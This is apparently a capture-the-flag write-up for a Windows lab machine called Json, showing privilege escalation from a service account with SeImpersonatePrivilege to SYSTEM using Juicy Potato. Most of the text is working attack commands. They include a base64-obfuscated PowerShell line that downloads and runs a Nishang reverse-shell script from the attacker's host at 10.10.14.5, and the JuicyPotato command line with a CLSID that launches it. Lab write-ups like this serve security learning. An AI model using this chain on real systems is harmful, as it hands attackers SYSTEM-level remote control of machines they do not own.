# Alternative way to exploit Json

## Privilege Escalation

The user _userpool_ has the **SeImpersonatePrivilege** permission set:
```
whoami /all
```
```
Privilege Name                Description                               State   
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

This makes it vulnerable to a Privilege Escalation tactic called [**Juicy Potato**](https://github.com/ohpe/juicy-potato).

Creating a script _(privesc.bat)_ on the box that will be executed with elevated privileges:
```
cmd /c powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADUALwBzAGgAZQBsAGwALgBwAHMAMQAnACkA
```

The Base64-encoded string is a PowerShell command to download and execute _shell.ps1_ which is the _Invoke-PowerShellTcp.ps1_ from the **Nishang** scripts:
```
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/shell.ps1')
```

Copying the script from our share to a different folder:
```
copy privesc.bat C:\Users\Public\Music\privesc.bat
```

Executing the script with **JuicyPotato**:
```
.\JuicyPotato.exe -t * -p C:\Users\Public\Music\privesc.bat -l 8001 -c '{e60687f7-01a1-40aa-86ac-db1cbf673334}'
```

After executing it, the listener on my IP and port 9001 starts a reverse shell as _SYSTEM_!
